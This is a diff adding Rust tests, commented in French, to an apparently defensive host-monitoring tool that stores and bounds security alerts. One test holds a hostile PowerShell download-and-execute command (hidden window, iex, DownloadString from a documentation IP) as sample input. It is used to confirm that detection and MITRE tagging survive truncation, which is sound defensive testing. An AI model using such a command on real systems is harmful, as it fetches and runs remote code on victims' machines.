@@ -2939,3 +2939,150 @@ fn exposition_paquet_bloque_reponse_a_un_flux() {
     assert!(!raisons.iter().any(|r| r.contains("203.0.113.40")), "{raisons:?}");
     let _ = std::fs::remove_dir_all(&d);
 }
+
+/// Phase 3.1 (docs/detection/modele-evenement.md) : un alertes.json au format d'avant la phase 3 se relit champ par
+/// champ, avec le modèle 0 ; les champs Regle et Collecte vides ne sont pas écrits
+#[test]
+fn phase3_alerte_ancienne_relue_sans_perte() {
+    use crate::commun::lire_alertes_texte;
+    let ancien = r#"[{"Id":"a1","Heure":"2026-10-20 10:00:00","Niveau":"Alerte","Score":3,"Processus":"x","Chemin":"C:\\x.exe",
+        "Destination":"203.0.113.9","Ip":"203.0.113.9","NomDns":null,"Port":443,"Raisons":"r","Pid":42,"Mitre":"T1071","Conseil":"c"}]"#;
+    let (a, ecartees) = lire_alertes_texte(ancien).expect("tableau lisible");
+    assert_eq!(ecartees, 0);
+    assert_eq!(a.len(), 1);
+    let x = &a[0];
+    assert!(x.id == "a1" && x.niveau == "Alerte" && x.score == 3 && x.port == 443 && x.pid == Some(42) && x.mitre == "T1071");
+    assert_eq!(x.modele, 0, "une alerte relue garde son modèle d'origine");
+    let json = serde_json::to_string(&a[0]).unwrap();
+    assert!(json.contains("\"Modele\":0") && !json.contains("\"Regle\"") && !json.contains("\"Collecte\""), "{json}");
+}
+
+/// Phase 3.1 : une seule alerte illisible ne fait plus perdre tout l'historique (avant : lire rendait None, puis le
+/// premier ajout réécrivait un fichier vide)
+#[test]
+fn phase3_une_alerte_mal_formee_ne_fait_pas_perdre_les_autres() {
+    use crate::commun::{lire_alertes_texte, Alerte};
+    let mut v: Vec<serde_json::Value> = (0..999).map(|i| serde_json::json!({ "Id": format!("a{i}"), "Niveau": "Info", "Score": 0 })).collect();
+    v.insert(500, serde_json::json!({ "Id": "mauvaise", "Score": "pas un nombre" }));
+    let texte = serde_json::to_string(&v).unwrap();
+    assert!(serde_json::from_str::<Vec<Alerte>>(&texte).is_err(), "témoin : la lecture d'un bloc échoue");
+    let (a, ecartees) = lire_alertes_texte(&texte).expect("tableau lisible");
+    assert_eq!((a.len(), ecartees), (999, 1));
+    assert!(a.iter().all(|x| x.id != "mauvaise"));
+    // Texte qui n'est pas un tableau : illisible (le fichier sera mis de côté, jamais écrasé)
+    assert!(lire_alertes_texte("{\"Id\":\"a\"}").is_none());
+    assert!(lire_alertes_texte("pas du json").is_none());
+    crate::tests::torturer_texte(&texte[..400.min(texte.len())], &mut |t| { let _ = lire_alertes_texte(t); });
+}
+
+/// Relecture de #72 : ordre des contrôles d'alertes.json ; un fichier refusé n'est jamais déplacé, même trop grand (D4) ;
+/// un contenu qui n'est pas de l'UTF-8 est mis de côté, pas laissé à l'écrasement (D5) ; des éléments écartés gardent
+/// une copie (décision « Lire » avec un nombre)
+#[test]
+fn phase3_decision_alertes() {
+    use crate::commun::{decision_alertes, DecisionAlertes, TAILLE_MAX_ALERTES};
+    let refuse = |d: DecisionAlertes| matches!(d, DecisionAlertes::Rien);
+    let de_cote = |d: DecisionAlertes, r: &str| matches!(d, DecisionAlertes::MettreDeCote(x) if x == r);
+    assert!(refuse(decision_alertes(false, TAILLE_MAX_ALERTES + 1, None)), "fichier refusé mais trop grand : déplacé");
+    assert!(refuse(decision_alertes(false, 10, Some(b"[]"))), "fichier refusé : lu");
+    assert!(de_cote(decision_alertes(true, TAILLE_MAX_ALERTES + 1, None), "trop-grand"));
+    assert!(de_cote(decision_alertes(true, 4, Some(&[0x5b, 0xff, 0xfe, 0x5d])), "illisible"), "non UTF-8 : laissé à l'écrasement");
+    assert!(de_cote(decision_alertes(true, 6, Some(b"{\"a\":1}")), "illisible"));
+    assert!(refuse(decision_alertes(true, 10, None)), "lecture impossible : rien de déplacé");
+    match decision_alertes(true, 40, Some(br#"[{"Id":"a"},{"Score":"x"}]"#)) {
+        DecisionAlertes::Lire(a, n) => assert_eq!((a.len(), n), (1, 1)),
+        _ => panic!("lecture partielle"),
+    }
+    let source = include_str!("api.rs");
+    assert!(source.contains("commun::lire_alertes_sans_effet()") && !source.contains(concat!("commun::lire(\"alertes", ".json\")")), "API en tout ou rien");
+}
+
+/// Audit de sécurité de #72, S72-01 : une alerte aux champs hostiles (valeur Run d'1 Mo de caractères de contrôle) est
+/// bornée ; 1000 alertes bornées tiennent sous TAILLE_MAX_ALERTES ; bornage et écriture retenue posés dans le moniteur
+#[test]
+fn phase3_alerte_bornee() {
+    use crate::commun::{borner_alerte, Alerte, MAX_RAISONS_ALERTE, TAILLE_MAX_ALERTES};
+    let hostile: String = std::iter::repeat_n('\u{1}', 524_287).collect();
+    let mut a = Alerte { raisons: hostile.clone(), chemin: hostile.clone(), parent: hostile.clone(), processus: hostile.clone(),
+        destination: hostile.clone(), ip: Some(hostile.clone()), nom_dns: Some("\u{10FFFF}".repeat(600_000)), ..Default::default() };
+    borner_alerte(&mut a);
+    let octets = serde_json::to_vec(&a).unwrap().len();
+    assert!(octets < 16 * 1024, "alerte bornée de {octets} octets");
+    assert!(octets * 1000 < TAILLE_MAX_ALERTES as usize);
+    assert_eq!(a.raisons.chars().count(), MAX_RAISONS_ALERTE + 3, "500 premiers, « … », 500 derniers");
+    assert!(!a.raisons.chars().any(|c| c.is_control()));
+    // Alerte ordinaire inchangée
+    let mut b = Alerte { raisons: "connexion vers 203.0.113.9".into(), chemin: r"C:\x.exe".into(), ..Default::default() };
+    borner_alerte(&mut b);
+    assert!(b.raisons == "connexion vers 203.0.113.9" && b.chemin == r"C:\x.exe");
+    let source = include_str!("moniteur.rs");
+    let debut = source.find("fn ajouter_alerte_brute").unwrap();
+    let corps = &source[debut..debut + 600];
+    let (b, f) = (corps.find("commun::borner_alerte(&mut a)").expect("bornage absent"), corps.find("apprentissage::filtrer(&mut a)").expect("filtrer"));
+    assert!(corps.find("mitre::enrichir(&mut a)").unwrap() < b && f < b, "bornage avant les décisions sur le texte entier (S72-06)");
+    let e = source.find("fn ecrire_alertes").unwrap();
+    assert!(source[e..e + 600].contains("commun::ecriture_alertes_permise()"), "écriture d'alertes.json non retenue");
+}
+
+/// Audit de sécurité de #72, S72-06 : une persistance malveillante rallongée (motif après 1100 espaces) garde son signal
+/// fort et sa technique MITRE, décidés sur le texte entier ; le bornage garde la remarque finale visible
+#[test]
+fn phase3_bornage_garde_la_conclusion() {
+    use crate::commun::{borner_alerte, Alerte};
+    let commande = format!("powershell.exe{}-w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", " ".repeat(1100));
+    let remarque = crate::processus::suspicion(&commande).expect("motif PowerShell");
+    let mut a = Alerte { niveau: "Alerte".into(), score: 3, raisons: format!("NOUVEAU démarrage automatique : {commande} [{remarque}]"), ..Default::default() };
+    crate::mitre::enrichir(&mut a);
+    assert!(crate::apprentissage::signal_fort(&a), "témoin : signal fort sur le texte entier");
+    let mitre = a.mitre.clone();
+    assert!(mitre.contains("T1059.001"), "témoin : technique PowerShell ({mitre})");
+    borner_alerte(&mut a);
+    assert!(a.raisons.contains(remarque), "remarque coupée par le bornage : {}", a.raisons);
+    assert_eq!(a.mitre, mitre);
+}
+
+/// Relecture de #72, D7 : un fichier mis de côté compte comme historique (pas de nouvel apprentissage)
+#[test]
+fn phase3_historique_mis_de_cote_compte() {
+    use crate::commun::historique_alertes_existe;
+    let n = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+    assert!(historique_alertes_existe(&n(&["config.json", "alertes.json"])));
+    assert!(historique_alertes_existe(&n(&["alertes-trop-grand-20261025120000.json"])));
+    assert!(historique_alertes_existe(&n(&["Alertes-illisible-20261025120000-1.JSON"])));
+    assert!(!historique_alertes_existe(&n(&["config.json", "apprentissage.json", "alertes.json.tmp", "incidents.json"])));
+    assert!(include_str!("apprentissage.rs").contains("commun::historique_alertes_existe(&commun::noms_du_dossier())"));
+}
+
+/// Phase 3.1 : une alerte d'un modèle plus récent (retour arrière) se lit, ses champs inconnus sont ignorés
+#[test]
+fn phase3_champs_inconnus_ignores() {
+    use crate::commun::lire_alertes_texte;
+    let (a, ecartees) = lire_alertes_texte(r#"[{"Id":"a","Modele":2,"Regle":"DEF-005","Collecte":"JournalDefender","ChampFutur":{"x":1}}]"#).unwrap();
+    assert_eq!(ecartees, 0);
+    assert!(a[0].modele == 2 && a[0].regle == "DEF-005" && a[0].collecte == "JournalDefender");
+}
+
+/// Phase 3.1 : toute nouvelle alerte porte le modèle actuel, posé à un seul endroit (ajouter_alerte_brute) ; une alerte
+/// qui a déjà un modèle le garde
+#[test]
+fn phase3_nouvelle_alerte_porte_le_modele() {
+    use crate::commun::{marquer_modele, Alerte, MODELE_ALERTE};
+    assert_eq!(MODELE_ALERTE, 1);
+    let mut a = Alerte::default();
+    marquer_modele(&mut a);
+    assert_eq!(a.modele, MODELE_ALERTE);
+    let mut b = Alerte { modele: 2, ..Default::default() };
+    marquer_modele(&mut b);
+    assert_eq!(b.modele, 2);
+    let source = include_str!("moniteur.rs");
+    let debut = source.find("fn ajouter_alerte_brute").expect("ajouter_alerte_brute");
+    assert!(source[debut..debut + 400].contains("commun::marquer_modele(&mut a)"), "ajouter_alerte_brute ne pose plus le modèle");
+}
+
+/// Phase 3.1 : le moniteur lit alertes.json par la lecture tolérante, plus par commun::lire (tout ou rien)
+#[test]
+fn phase3_moniteur_lit_les_alertes_par_element() {
+    let source = include_str!("moniteur.rs");
+    assert!(source.contains("alertes: commun::lire_alertes(),"), "chargement des alertes");
+    assert!(!source.contains(concat!("commun::lire(\"alertes", ".json\")")), "lecture tout ou rien d'alertes.json");
+}
